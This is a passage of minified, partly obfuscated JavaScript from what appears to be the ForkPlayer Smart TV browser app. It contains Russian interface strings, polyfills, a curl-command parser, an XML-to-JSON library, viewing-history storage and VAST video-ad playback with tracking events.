увидеть","OshibkaUstanovki":"Ошибка установки","vSmHubVidgNaidDop":"в смартхаб!</b><br>Виджет вы найдете в приложениях в смартхабе, или в Дополнительные приложения (Серия F)","PustayaPapka":"Пустая папка","BlueKnProporcii":"<i>Изменение пропорций видео</i><br><span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> Синяя кнопка во время проигрывания видео","Zakrit":"Закрыть","NachatZanovo":"Начать заново","ZagruzhatListiMozhoS":"Загружать сюда листы с компьютера можно с помощью","Summa":"Сумма","Valuta":"Валюта","PlatSistema":"Платежная система","NaprimerVchera":"Например, вчера в","VvDatuPlatezha":"Введите дату и время платежа","ThanksForYou":"Спасибо за поддержку проекта","Ozhidanie":"Ожидание","Prinyato":"Обработка","Enter URL or search on":"Введите URL или выполните поиск по","Bookmark toolbar":"Панель закладок","NeobhodimRemoteFork":"Для выполнения этой операции необходимо запустить RemoteFork на компьютере или андроиде<br>Подробнее на forkbrowser.top","Translate":"Перевести страницу на ","Yazik":"Язык","OchistIst":"Очистить поле / историю","VVOD":"ВВОД","BistrijPoskVverh":"Быстр. поиск: Вверх","Vniz":"Вниз","Select":"Выбрать","Select city":"Выбрать город","system":"Системная","Recommendation":"Рекомендации","Clear recommendation":"Очистить рекомендации","Documenti":"Документы","Photo":"Фотографии","Keyboard":"Клавиатура","keyboard":"клавиатура","fromPage":"со страницы","fromWall":"со стены","photo":"фото","Exit":"Выйти","SavedPhoto":"Сохраненные фотографии","Slideshow":"Слайдшоу","sec":"сек","Category":"КАТЕГОРИЯ","Categorys":"Категории","ForResetAppPressButton":"Для сброса настроек, нажмите сейчас кнопку","ALL":"ВСЕ","OpenFromProxy":"Запуск через прокси","PredpDor":"Предп. дорожка","InFullScreen":"На весь экран","Iread":"Я прочитал(а)","NotShow":"Больше не показывать","AudioMini":"Аудио мини","OffMiniPlayer":"Здесь можно отключить использование специального мини плеера для проигрывания mp3 файлов","ConnectToServer":"Соединение с сервером","NewDNS":"Доступен новый ДНС","From":"Отправитель","AutoSync":"Автосинхронизация","Mark":"Отметить","several":"несколько","existOverwrite":"существует! Перезаписать?","OverwriteAll":"Перезаписать все","SkipAll":"Пропустить все","Deselect":"Отменить выделение","Queue":"В очереди","DeleteFromStartMenu":"Удалить из стартового меню","Edit":"Редактировать","Rename":"Переименовать","Interface Setup":"Настройка интерфейса","ChangeURLicon":"Сменить адрес иконки","EnterURLicon":"Введите адрес иконки","Icon":"Иконка","SetIconFor":"Установить иконкой для","EnterTitle":"Введите название","SelectIcon":"Выбрать иконку","Edit URL":"Редактировать URL","Timeout connection to stream IPTV":"Таймаут подключения к IPTV","SetDefaultStartMenu":"Сбросить настройки старт. меню и его вид","PreviousFileWillBeOverwritten":"Предыдущий архив настроек будет перезаписан","PressStopToCancel":"Нажмите Стоп для отмены","Show rating":"Рейтинг ссылок","Count":"Количество","Percent":"Проценты","Server":"Сервер","or Add search engine in settings":"или Добавьте поисковую систему в настройках","Show ratings and views of resources and playlists":"Показывать рейтинг и количество просмотров ресурсов и плейлистов","WhileCopyingFilesCannotViewVideoAndAudio":"Во время копирования файлов нельзя смотреть видео и аудио","NeedToOpenAndCloseTheVideoPlayerThenRepeatCopying":"Нужно открыть и закрыть это видео в плеере, потом повторить копирование","player not loaded or not supported on your device! Change type player in Settings or restart app":"плеер не загружен или не поддерживается на вашем устройстве! Измените тип плеера в Настройках или перезапустите приложение","Tabs and toolbar":"Вкладки и панель","Hide automatically":"Скрывать автоматически","Always display":"Всегда отображать","Donate to the development of this browser":"Поддержите развитие браузера","Next":"Далее","Clear sorted manually":"Очистить отсортированные вручную","from":"из","To open with":"Открыть с помощью","Change IP address":"Сменить IP адрес","Detect automatically":"Определить автоматически","Save page to cache":"Сохранить страницу в кеш","Renew":"Обновить","Enter manually":"Ввести вручную","Disable":"Отключить","Close":"Закрыть","Close all":"Закрыть все","Close other tabs":"Закрыть другие","Detect from":"Определить из","This device":"Это устройство","or":"или","ago":"назад","hours":"часов","days":"дней","weeks":"недель","months":"месяцев","years":"лет","Highest":"Наивысшее","Turn on":"Включить","High":"Высокое","Medium":"Среднее","Low":"Низкое","Very low":"Очень низкое","Add shortcut":"Добавить ярлык","Audioplayer":"Аудиоплеер","search engine":"поисковая система","View history":"Просмотр истории","Your recommendations":"Ваши рекомендации","Continue watching":"Продолжить смотреть","Playlist Search Engine":"Поисковая система по плейлистам","Movie parsers":"Кинопарсеры","Online parsers":"Онлайнпарсеры","Customize search":"Настроить поиск","Configuration, background, appearance":"Конфигурация, фоновый рисунок, вид","and other portals":"и другие порталы","My Search Engines":"Мои поисковые системы"};function totranslit(text,engToRus){var rus="щ   ш  ч  ц  ю  я  ё  ж  ъ  ы  э  а б в г д е з и й к л м н о п р с т у ф х ь".split(/ +/g),eng="shh sh ch cz yu ya yo zh `` y' e` a b v g d e z i j k l m n o p r s t u f x `".split(/ +/g);var x;for(x=0;x<rus.length;x++){text=text.split(engToRus?eng[x]:rus[x]).join(engToRus?rus[x]:eng[x]);text=text.split(engToRus?eng[x].toUpperCase():rus[x].toUpperCase()).join(engToRus?rus[x].toUpperCase():eng[x].toUpperCase())}
return text}
if(typeof JSON!=="object"){JSON={}}
if(typeof Object.create==='undefined'){Object.create=function(o){function F(){}
F.prototype=o;return new F()}}
if(!Object.keys){Object.keys=(function(){'use strict';var hasOwnProperty=Object.prototype.hasOwnProperty,hasDontEnumBug=!({toString:null}).propertyIsEnumerable('toString'),dontEnums=['toString','toLocaleString','valueOf','hasOwnProperty','isPrototypeOf','propertyIsEnumerable','constructor'],dontEnumsLength=dontEnums.length;return function(obj){if(typeof obj!=='object'&&(typeof obj!=='function'||obj===null)){throw new TypeError('Object.keys called on non-object')}
var result=[],prop,i;for(prop in obj){if(hasOwnProperty.call(obj,prop)){result.push(prop)}}
if(hasDontEnumBug){for(i=0;i<dontEnumsLength;i++){if(hasOwnProperty.call(obj,dontEnums[i])){result.push(dontEnums[i])}}}
return result}}())}
function mh(s,i){if(handler=="menu"){if(getSelect()!=-s||oInset.omni_hor!=i){setSelect(-4);oInset.omniSel(i);linkOver()}}}
if(!document.getElementsByClassName){document.getElementsByClassName=function(cls,node,tag){if(!node)node=document;if(!tag)tag='*';var them=node.getElementsByTagName(tag),rez=[];for(var notI=0;notI<them.length;++notI)
if(them[notI].className==cls)rez.push(them[notI]);return rez}}
function nmlz(s){s=trim11(s.replace(/<.*?>/g," ").replace(/сезон \d+/i,"").replace(/серия \d+/i,"").replace(/[\(\):\/\-!\?,\.\|]/g," "));s=s.replace(/\s+/g," ");return s}
function totrim(s){return s.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,'')}
function trim11(str){str=str.replace(/^\s+/,'');for(var i=str.length-1;i>=0;i--){if(/\S/.test(str.charAt(i))){str=str.substring(0,i+1);break}}
return str}
function parseCURL(s){if(0!=s.indexOf('curl '))return;var ch,regexp=new RegExp("(-[-a-zA-Z]+)?(\\s*?(\"|')(.*?[^\\\\])\\3)?(\\s|$)","g");var out={url:"",method:'GET',header:{}};var x=0;while((ch=regexp.exec(s))!==null){if(ch.index===regexp.lastIndex)regexp.lastIndex++;if(x++>40)break;var arg=ch[1]||"";var param=ch[4]||"";if(ch[3])param=param.replace(new RegExp("\\\\"+ch[3],"g"),ch[3]);switch(!0){case arg=='-A'||arg=='--user-agent':out.header['User-Agent']=param;break;case arg=='-e'||arg=='--referer':out.header.Referer=param;break;case arg=='-H'||arg=='--header':var field=param.split(":");if(field.length>2)field[1]=field.slice(1).join(":");out.header[field[0]]=(field[1]||"").replace(/^\s+/,"");break;case arg=='-d'||arg=='--data'||arg=='--data-ascii':out.method='POST';out.header['Content-Type']=out.header['Content-Type']||'application/x-www-form-urlencoded';out.body=param;break;case arg=='-u'||arg=='--user':out.header.Authorization='Basic '+btoa(param);break;case arg=='-I'||arg=='--head':out.method='HEAD';break;case arg=='-X'||arg=='--request':out.method=param;break;case arg=='-b'||arg=='--cookie':out.header['Set-Cookie']=param;break;case(param&&param.match(/^https?:\/\//)&&!0):out.url=param;break;case arg=='--compressed':out.header['Accept-Encoding']=out.header['Accept-Encoding']||'deflate, gzip';break}}
return out}
function ext_focus(b){if(b==null){maJor.setHandler("menu");Il01QllQll().focused(0)}
handler="ext";try{$_("frame-id").contentWindow.postMessage({'cmd':'focus','text':''},"*")}catch(e){}}
function ext_close(){maJor.setHandler("menu");$_("ext","");$_("ext").style.display="none"}
window.addEventListener('message',function(event){if(l0lIl1lTqx011IYpr=="playerjs"&&(handler=="player"||handler=="qual")){vPlayer.playerjs.message(event);return}},!1);var emptyCh={"title":"_FPZdesPusto_","description":"","stream_url":"","logo_30x30":"","playlist_url":""};function OpenUrl(url,n){if(n!=null){url.navigateurl=n}
Il01QllQll().navigate(url)}
function collect(a,b){var d={};for(p in a){d[p]=a[p]}
for(p in b){d[p]=b[p]}
return d}
var xmlToJSON=(function(){this.version="1.3.4";var options={mergeCDATA:!0,grokAttr:!0,grokText:!0,normalize:!0,xmlns:!0,namespaceKey:'_ns',textKey:'_text',valueKey:'_value',attrKey:'_attr',cdataKey:'_cdata',attrsAsObject:!0,stripAttrPrefix:!0,stripElemPrefix:!0,childrenAsArray:!1};var prefixMatch=new RegExp(/(?!xmlns)^.*:/);var trimMatch=new RegExp(/^\s+|\s+$/g);this.grokType=function(sValue){if(/^\s*$/.test(sValue)){return null}
if(/^(?:true|false)$/i.test(sValue)){return sValue.toLowerCase()==="true"}
if(isFinite(sValue)){return parseFloat(sValue)}
return sValue};this.parseString=function(xmlString,opt){return this.parseXML(this.stringToXML(xmlString),opt)}
this.parseXML=function(oXMLParent,opt){for(var key in opt){options[key]=opt[key]}
var vResult={},nLength=0,sCollectedTxt="";if(options.xmlns&&oXMLParent.namespaceURI){vResult[options.namespaceKey]=oXMLParent.namespaceURI}
if(oXMLParent.attributes&&oXMLParent.attributes.length>0){var vAttribs={};for(nLength;nLength<oXMLParent.attributes.length;nLength++){var oAttrib=oXMLParent.attributes.item(nLength);vContent={};var attribName='';if(options.stripAttrPrefix){attribName=oAttrib.name.replace(prefixMatch,'')}else{attribName=oAttrib.name}
if(options.grokAttr){vContent[options.valueKey]=this.grokType(oAttrib.value.replace(trimMatch,''))}else{vContent[options.valueKey]=oAttrib.value.replace(trimMatch,'')}
if(options.xmlns&&oAttrib.namespaceURI){vContent[options.namespaceKey]=oAttrib.namespaceURI}
if(options.attrsAsObject){vAttribs[attribName]=vContent}else{vResult[options.attrKey+attribName]=vContent}}
if(options.attrsAsObject){vResult[options.attrKey]=vAttribs}else{}}
if(oXMLParent.hasChildNodes()){for(var oNode,sProp,vContent,nItem=0;nItem<oXMLParent.childNodes.length;nItem++){oNode=oXMLParent.childNodes.item(nItem);if(oNode.nodeType===4){if(options.mergeCDATA){sCollectedTxt+=oNode.nodeValue}else{if(vResult.hasOwnProperty(options.cdataKey)){if(vResult[options.cdataKey].constructor!==Array){vResult[options.cdataKey]=[vResult[options.cdataKey]]}
vResult[options.cdataKey].push(oNode.nodeValue)}else{if(options.childrenAsArray){vResult[options.cdataKey]=[];vResult[options.cdataKey].push(oNode.nodeValue)}else{vResult[options.cdataKey]=oNode.nodeValue}}}}else if(oNode.nodeType===3){sCollectedTxt+=oNode.nodeValue}else if(oNode.nodeType===1){if(nLength===0){vResult={}}
if(options.stripElemPrefix){sProp=oNode.nodeName.replace(prefixMatch,'')}else{sProp=oNode.nodeName}
vContent=xmlToJSON.parseXML(oNode);if(vResult.hasOwnProperty(sProp)){if(vResult[sProp].constructor!==Array){vResult[sProp]=[vResult[sProp]]}
vResult[sProp].push(vContent)}else{if(options.childrenAsArray){vResult[sProp]=[];vResult[sProp].push(vContent)}else{vResult[sProp]=vContent}
nLength++}}}}else if(!sCollectedTxt){if(options.childrenAsArray){vResult[options.textKey]=[];vResult[options.textKey].push(null)}else{vResult[options.textKey]=null}}
if(sCollectedTxt){if(options.grokText){var value=this.grokType(sCollectedTxt.replace(trimMatch,''));if(value!==null&&value!==undefined){vResult=value}}else if(options.normalize){vResult=sCollectedTxt.replace(trimMatch,'').replace(/\s+/g," ")}else{vResult=sCollectedTxt.replace(trimMatch,'')}}
return vResult}
this.xmlToString=function(xmlDoc){try{var xmlString=xmlDoc.xml?xmlDoc.xml:(new XMLSerializer()).serializeToString(xmlDoc);return xmlString}catch(err){return null}}
this.stringToXML=function(xmlString){try{var xmlDoc=null;if(window.DOMParser){var parser=new DOMParser();xmlDoc=parser.parseFromString(xmlString,"text/xml");return xmlDoc}else{xmlDoc=new ActiveXObject("Microsoft.XMLDOM");xmlDoc.async=!1;xmlDoc.loadXML(xmlString);return xmlDoc}}catch(e){return null}}
return this}).call({});if(typeof module!="undefined"&&module!==null&&module.exports)module.exports=xmlToJSON;else if(typeof define==="function"&&define.amd)define(function(){return xmlToJSON});function escapeHtml(text){var map={'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};return text.replace(/[&<>"']/g,function(m){return map[m]})}
function getInfoUrl(url,infourl){url=infourl||url||gV(IlIll11I("lO10111O0001lOl00Ypr")||gP("lO10111O0001lOl00Ypr"))||"";if(url.match(/http:\/\/[^\/]+\/hls\//))return url.replace(/http:\/\/([^\/]{5})[^\/]+\/hls\//,"http://$1.../hls/");url=url.replace(/(\?|&)?w_lang=.*$/,"");return url}
function lll1IlIlOBP_II1lYpr(o){try{var page=(IlIll11I()||gP());if(!page||!page.global||!Il01QllQll()||Il01QllQll("is_private"))return;var xu=page.lO10111O0001lOl00Ypr;var ICON=Il01QllQll().getIcon();var TITLE=String(Il01QllQll().get("title"));if(!TITLE)return;if(Il01QllQll().get("url",-2)=="about:blank"){var se=Il01QllQll().get("s",-2);if(se>=0){var data=getVars("about:blank");if(se!=""&&!ICON.match(/1px\.png/)&&gV(data.channels[se],"source")=="fav"&&gV(data.channels[se],"logo_30x30")===""){data.fav[data.channels[se].id].logo_30x30=ICON;setVars("start",data)}}}
if(!xu.match(/^(http|html:\/\/http|vk|magnet|bookmarks)/)||xu.match(/(#submenu|no_save)/)||is_ifr()||l0OII100kdNdQl01lYpr()||gV(page.global,"cacheinfo")=="nocache"){return}
if(handler=="menu"&&o){if(!is_local(xu)&&!xu.match(/(#submenu|#archive|no_save|search=)/)&&!TITLE.match(/^Стр. (\d+) \/ (.*)$/)){var nx=1;var pu=Il01QllQll().get("url",-2);if(pu=="about:blank"){var se=Il01QllQll().get("s",-2);if(se>=0){var data=getVars("about:blank");if(se!=""&&!ICON.match(/1px\.png/)&&gV(data.channels[se],"source")=="fav"&&gV(data.channels[se],"logo_30x30")==""){data.fav[data.channels[se].id].logo_30x30=ICON;setVars("start",data)}}
nx=6}else if(pu.match(/^http:\/\/spiderxml\.com($|#)/))nx=6;if(!maJor.userTop[xu])maJor.userTop[xu]={"c":nx,"title":TITLE,"logo_30x30":ICON,"tp":T.timestamp,"parser":Il01QllQll().get("p"),"local":Il01QllQll().get("l")};else{maJor.userTop[xu].c+=1;maJor.userTop[xu].tp=T.timestamp}
maJor.write("datas",l1OOl0I0IASY10lQ10Ypr(maJor.userTop))}else{}
if(gV(lO01II111Irn0OI1IlYpr[0],"xml_url")!=xu){lO01II111Irn0OI1IlYpr.unshift({"xml_url":xu,"type":gV(o.parentCh,"type"),"model":maJor.api,"hardware":maJor.hardware,"time":T.timestamp,"title":TITLE,"icon":ICON})}}else if(handler=="player"){if(getSelect()>=0&&vPlayer.playElement){if(gV(lO01II111Irn0OI1IlYpr[0],"xml_url")==xu&&gV(lO01II111Irn0OI1IlYpr[0],"select")==getSelect()){lO01II111Irn0OI1IlYpr[0].start_time=curTime}else lO01II111Irn0OI1IlYpr.unshift({"xml_url":xu,"model":model,"hardware":kjtYpr.hardware,"time":T.timestamp,"select":getSelect(),"ch":{"logo_30x30":curCh("logo_30x30"),"title":curCh("title"),"play_url":vPlayer.playUrl,"stream_url":curCh("stream_url"),"parser":curCh("parser"),"ident":vPlayer.playElement.ident,"start_time":vPlayer.curTime,"total_time":vPlayer.totalTime},"title":TITLE,"icon":ICON})}}
if(lO01II111Irn0OI1IlYpr.length>100)lO01II111Irn0OI1IlYpr.splice(100,1);maJor.write("history",l1OOl0I0IASY10lQ10Ypr(lO01II111Irn0OI1IlYpr))}catch(e){jsshowErr("Error save history<br>"+e.message)}}
var incpage=0;var adsPage={last:0,q:0,interval:900,is_rek:0,rek_url:"rek_on",rek_sel:1,num:0,rek_totaltime:0,rek_curtime:0,mode:"",lTime:-1,point:{},recursionCount:0,stop:function(){var c=this;c.last=T.timestamp;maJor.write("rek",c.last);c.is_rek=0;c.rek_url=""},slide:function(){var c=this;c.rekBox();c.rek_totaltime=c.point["Duration"]||3;if(c.rek_totaltime>600)c.rek_totaltime=600;c.rek_curtime=0;c.rek_curtimeint=setInterval(" if(adsPage.is_rek) vPlayer.getVideoPlayInfo(++adsPage.rek_curtime,"+c.rek_totaltime+"); else clearInterval(adsPage.rek_curtimeint);",1000)},key:function(key){var c=this;if(key==VK_BACK){if(c.is_rek){vPlayer.lll0Q10I0lI1O0Oll0OOYpr();c.state(1)}}
if(key==32||key==10252){if(vPlayer.paused)vPlayer.play();else vPlayer.pause()}else if(key==VK_LEFT){c.rek_sel--;c.rekBox()}else if(key==VK_RIGHT){c.rek_sel++;c.rekBox()}else if(key==VK_ENTER){if(c.rek_sel==0&&c.point["ClickThrough"]){vPlayer.pause();confirmed.create("Перейти по обьявлению <b>"+c.point["linkTxt"]+"</b>?<br>"+(c.point["ClickThrough"].indexOf("html://")==0?"ForkPlayer при этом будет закрыт!":c.point["ClickThrough"]),"_FPAre you sure_?").fun=[function(){llOIO1vwKiyIOOO1lYpr(gV(c.point,"complete"),"half");c.endrek();vPlayer.lll0Q10I0lI1O0Oll0OOYpr();if(c.point["ClickThrough"].indexOf("html://")==0){document.location=c.point["ClickThrough"].substr(7)}else if(c.point["ClickThrough"].indexOf("http")==0&&c.point["ClickThrough"].indexOf("xml")==-1){if(maJor.platform()=="android-device")document.location=c.point["ClickThrough"];else{$_("ext").style.display="block";$_("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; background-color:black;" width="1280" height="640" src="'+c.point["ClickThrough"]+'" />');kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен сайт в iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);handler="ext"}}else OpenUrl({"title":"Реклама "+c.point["linkTxt"],"playlist_url":c.point["ClickThrough"]})},function(){handler="player";vPlayer.play()}]}else if(c.point["skipTime"]&&c.point["skipTime"]<vPlayer.getCur()){vPlayer.pause();c.endrek();c.rek_url="";setTimeout(function(){c.skip()},150);return}}},err_rek:function(stat){var c=this;kjtYpr.inf("");if(handler!="menu"&&!vPlayer.stopped)vPlayer.easystop();maJor.setHandler("menu");c.stop();c.llll1Zvc0cl1QllOYpr()},endrek:function(){var c=this;$_("popUp").style.display="none";if(ttmac){setTimeout('kjtYpr.popUp("endrek '+vPlayer.curTime+'/'+vPlayer.totalTime+'", 2000);',10000)}
kjtYpr.popUp("",100);if(l0lIl1lTqx011IYpr=="image"||(vPlayer.getCur()>1&&vPlayer.getTotal()>2)){adsPage.sendEvent("impression|dstUrl|start|midpoint|firstQuartile|thirdQuartile|complete")}else{}
c.stop();c.state(0)},rekBox:function(text){var c=this;if(!$_("playerBottom"))return;if(c.is_rek){$_("prekinfo").style.display="block";$_("player_time").style.display="none";$_("buttonTop").style.display="none";$_("playerBottom").style.top=(maJor.screen().h-34)+"px";if(c.rek_sel<0)c.rek_sel=1;else if(c.rek_sel>1)c.rek_sel=0;if(text){$_("rek_button2").style.display="block";$_("rek_button2",text)}else if(c.point["ClickThrough"]&&c.point["linkTxt"]){$_("rek_button1").style.display="block";if(c.point["linkTxt"].split("%").length>4)c.point["linkTxt"]=decodeURI(c.point["linkTxt"]);$_("rek_button1","<b>Перейти по ссылке</b><br>"+c.point["linkTxt"])}else $_("rek_button1").style.display="none";if($_("rek_button1").style.display=="none")c.rek_sel=1;if(c.rek_sel==0){$_("rek_button1").style.border="4px solid white";$_("rek_button2").style.border="1px solid gray"}else if(c.rek_sel==1){$_("rek_button1").style.border="1px solid gray";$_("rek_button2").style.border="4px solid white"}
$_("movTitle",'<div style="position: absolute;margin-left: -180px;">ADS</div>'+(gVs(c.point,"title")||gV(gP("global"),"advertising").title||""))}else{$_("player_time").style.display="block";$_("buttonTop").style.display="block";$_("playerBottom").style.top="";$_("playerBottom").style.bottom="5px";$_("playerBottom").style.height="188px";if($_("playerBottom").style.bottom=="")$_("playerBottom").style.top="73%"}},state:function(m){var c=this;if(m!=null){if(m===0){c.is_rek="";c.rek_url=""}else if(m===1){c.is_rek="";c.rek_url="rek_on"}}else{if(c.is_rek)return 2;else if(c.rek_url=="rek_on")return 1;else if(!c.rek_url)return 0;else return-1}},is_show_rek:function(stream){var c=this;if(stream){if(c.noforce){c.noforce=0;return 0}
var ads=maJor.params.get("ads");if(ads==2)return 1;if(ads&&maJor.timestamp<3){c.last=c.last||maJor.read("rek")||0;if(c.q>9)return 0;if(c.num>0)return 0;if(Math.abs(T.timestamp-c.last)>c.interval&&is_white()){return 1}}}
return 0},llOIO1vwKiyIOOO1lYpr:function(url,type,el){var c=this;vPlayer.lll0Q10I0lI1O0Oll0OOYpr();handler="player";pstream=!1;vPlayer.paused=!1;c.q++;c.lTime=-1;maJor.statusbar("LOAD AD "+url);vPlayer.rekLife();c.recursionCount=0;if(type=="vast")c.loadAdvHelper(url);else if(type=="video"){c.is_rek=1;c.playVast(url);var skip=gV(gP("global"),"advertising").skip||0;if(skip>0)c.point={skipTime:skip}}else{maJor.statusbar("No support AD type "+c.rek_type);return 0}
c.playElement=el;return 1},loadAdvHelper:function(url){var c=this;if(c.recursionCount>5){return}
if(ttmac){kjtYpr.popUp("rek num="+rek_num+"<br>"+curTime+"/"+totalTime+"<br>start<br>"+url,300)}
c.is_rek=1;uHelper.create("directnoheader").hid().get(url).parse=function(s){if(c.is_rek&&s){s=s.replace(/\n/g,"").replace(/\r/g,"");if(s.indexOf("MediaFiles")>0||s.indexOf("VASTAdTagURI")>0){if(s.indexOf("VASTAdTagURI")>0){s=s.replace(/\[CACHEBUSTING\]/g,_.random(10000000,99999999));s=s.replace(/%7BENCODED_REF_URL%7D/g,encodeURIComponent(document.referrer));var regexp=new RegExp("VASTAdTagURI.{1,70}(http.*?)\]","ig");var items=regexp.exec(s);if(items!=null){c.recursionCount++;c.loadAdvHelper(items[1])}}else{c.processMediaFiles(s)}}else{c.err_rek()}}else{c.err_rek()}}},processMediaFiles:function(s){var c=this;var regexp=new RegExp("<MediaFile.*?video.*?((http|//).*?)\]","ig");var items=regexp.exec(s);if(items!=null){c.rek_url=items[2]==="//"?"http:"+items[1]:items[1]}else{regexp=new RegExp("<MediaFile.*?type=.image\\/.*?>(.*?)<\\/MediaFile>","i");items=regexp.exec(s);if(items!=null){c.rek_url=items[1].replace("<![CDATA[","").replace("]]>","");c.rek_url=c.rek_url.indexOf("//")===0?"http:"+c.rek_url:c.rek_url}}
c.processImpressions(s);c.processTrackingEvents(s);c.extractAdditionalInfo(s);if(c.rek_url)c.playVast(c.rek_url);else c.err_rek()},processImpressions:function(s){var c=this;var regexp=new RegExp("<Impression.*?>(.*?)<\\/Impression","ig");c.point.impression=[];var items;while((items=regexp.exec(s))!=null){var it=totrim(items[1].replace("<![CDATA[","").replace("]]>",""));it=it.indexOf("//")===0?"http:"+it:it;c.point.impression.push(it)}},processTrackingEvents:function(s){var c=this;var events=["start","midpoint","firstQuartile","thirdQuartile","complete","close","skip"];events.forEach(function(event){var regexp=new RegExp("<Tracking[^>]*?event=\""+event+"\".*?>(.*?)<\\/Tracking","ig");c.point[event]=[];var items;while((items=regexp.exec(s))!=null){var it=totrim(items[1].replace("<![CDATA[","").replace("]]>",""));it=it.indexOf("//")===0?"http:"+it:it;c.point[event].push(it)}})},extractAdditionalInfo:function(s){var c=this;var mtc;mtc=s.match(/<AdTitle>(.*?)<\/AdTitle>/);c.point.title=mtc!=null?mtc[1].replace("<![CDATA[","").replace("]]>",""):"";mtc=s.match(/<Extension type=.linkTxt..*?>(.*?)<\/Extension>/);c.point.linkTxt=mtc!=null?mtc[1].replace("<![CDATA[","").replace("]]>",""):"";mtc=s.match(/<Extension.*?skipTime.*?00:00:(.*?)\]/);c.point.skipTime=mtc!=null?parseInt(mtc[1]):null;if(!c.point.skipTime){mtc=s.match(/skipoffset="00:00:(.*?)"/);c.point.skipTime=mtc!=null?parseInt(mtc[1]):null}
if(!c.point.skipTime){mtc=s.match(/<Extension.*?skipTime.*?00:(.*?)\]/);c.point.skipTime=mtc!=null?parseInt(mtc[1]):null}
mtc=s.match(/<Duration>(.*?)<\/Duration>/);c.point.duration=mtc!=null?mtc[1].replace("<![CDATA[","").replace("]]>","").split(":").reduce(function(total,value,index,array){return total+(parseInt(value)*Math.pow(60,array.length-index-1))},0):"";mtc=s.match(/<ClickThrough>(.*?)<\/ClickThrough>/);c.point.clickThrough=mtc!=null?mtc[1].replace("<![CDATA[","").replace("]]>",""):"";mtc=s.match(/dstUrl\".*?(.{1,100})\]/);c.point.dstUrl=mtc!=null?mtc[1]:""},sendEvent:function(n){var c=this;if(typeof n=="string"&&n.indexOf("|")>=0)n=n.split("|");if(typeof n=="object"){maJor.each(n,function(val){if(c.point[val]){var myImage=new Image(1,1);myImage.src=c.point[val];c.point[val]=null}})}else{if(c.point[n]){var myImage=new Image(1,1);myImage.src=c.point[n];c.point[n]=null}}},skip:function(){var c=this;c.sendEvent("impression|start|complete".split("|"));c.rek_url="";if(maJor.platform()==="android-device"){vPlayer.lll0Q10I0lI1O0Oll0OOYpr()}else{vPlayer.easystop()}
c.llll1Zvc0cl1QllOYpr()},event:function(cur,total){var c=this;if(total>600){adsPage.state(0);vPlayer.lll0Q10I0lI1O0Oll0OOYpr();c.llll1Zvc0cl1QllOYpr();return}
if(c.lTime!=cur){c.lTime=cur;if(total-cur<=1){if(!vPlayer.end_ok)vPlayer.endTimer=setTimeout("vPlayer.endvideo();",1000);vPlayer.end_ok=!0;return}}
if(c.point["skipTime"]&&c.point["skipTime"]<cur&&cur<=total){c.rekBox("Пропустить рекламу <img width=15 src='"+_img("_ST_enter.png")+"' />")}else{if(c.point["skipTime"]&&c.point["skipTime"]<total)var ost=c.point["skipTime"]-cur;else ost=total-cur;if(ost<0)ost=0;c.rekBox("Пропустить через "+ost+" сек.")}
if(c.point["impression"])c.sendEvent("impression|");if(c.point["dstUrl"])c.sendEvent("dstUrl");if(c.point["start"])c.sendEvent("start");else if(Math.round(total/2)==cur){c.sendEvent("firstQuartile|midpoint")}else if(Math.round(total/4)==cur){c.sendEvent("firstQuartile")}else if(Math.round((total/4)*3)==cur){c.sendEvent("midpoint|thirdQuartile")}},llll1Zvc0cl1QllOYpr:function(){var c=this;if(c.playElement){vPlayer.stream.create(c.playElement)}else{c.noforce=1;Il01QllQll().play(null)}},playVast:function(url){var c=this;if(url){c.rek_url=url;pstream=(c.rek_url.indexOf(".m3u8")>0)?1:0;l0lIl1lTqx011IYpr=(pstream)?maJor.params.get('streamplayer'):maJor.params.get('player');if(maJor.platform()=="android-device")l0lIl1lTqx011IYpr="html5";if(maJor.platform()=="maple")l0lIl1lTqx011IYpr="media";if(ttmac){setTimeout('kjtYpr.popUp("REK: '+c.rek_url+'", 2000);',6500)}
handler="player";vPlayer.playElement={};vPlayer.renderPlayer();vPlayer.l1100OlxlQQ00lO0Ypr(c.rek_url);return}}};var FXMLPage={create:function(){var c=Object.create(this);c.channels=[];c.request_id=null;c.menu=[];c.style={};c.lO10111O0001lOl00Ypr="";c.URL_REQUEST="";c.typeSource="";c.group=[];c.IFRAMES=[];c.IFRAMES_INSERT=0;c.curCh=null;c.parentCh=null;c.REQUEST_XXX=0;c.source="";c.is_iptv=0;c.hideRight=0;c.REQUEST_ID=null;c.global={};c.l10I0O1I1lRl0QlI1OYpr=null;c.typeList="list";c.l1IOlOIIj1Du1I0lYpr=null;c.sPos={}
c.sPosX=0;c.sPosY=0;c.CAS=[];c.count=0;c.posX=0;c.posY=0;c.canceled=0;c.SEARCH_TEMPL="";incpage++;c.inc=incpage;c.input={};c.l01lI10Il1zvj10lI1Ypr=0;c.is_mark=0;c.is_mark_array={};c.ERR=null;return c},toTags:function(k,t){for(var i=0;i<t.length;i++)if(typeof k[t[i]]=="undefined")k[t[i]]="";return k},detChxxx:function(v){if(maJor.params.get('passwordkey')!=""&&maJor.Password!=maJor.params.get('passwordkey')){if(gV(v,"playlist_url")!="submenu"&&gV(v,"type")!="enterurl"){var keys=["stream_url","playlist_url","title","group"];for(var i=0;i<keys.length;i++){var key=keys[i];if(is_xxx(v[key])){this.REQUEST_XXX=1;return 1}}}
if(gV(v,"is_parent_lock")=="1"){this.REQUEST_XXX=1;return 1}}},cancel:function(){var c=this;if(typeof c.l10I0O1I1lRl0QlI1OYpr.page=="undefined")c.l10I0O1I1lRl0QlI1OYpr.page=c;c.canceled=1;clearTimeout(c.tTimer);if(c.xhr!=null)c.xhr.abort();if(c.l10I0O1I1lRl0QlI1OYpr.page.canceled)is_loadpage(0);delete c.l10I0O1I1lRl0QlI1OYpr.loadPage;maJor.sethash()},oncomplete:function(pq,status,returnData){try{var c=this,data=null;if(c.canceled){return}
var s=gV(pq,"source");var xml_url=c.lO10111O0001lOl00Ypr;if(!c.l01lI10Il1zvj10lI1Ypr){if(s=="-histback-"){c.cancel();pq.l10I0O1I1lRl0QlI1OYpr.reload();return}
if(s=="-histback1-"){c.cancel();pq.l10I0O1I1lRl0QlI1OYpr.navigateHist(-2);return}}
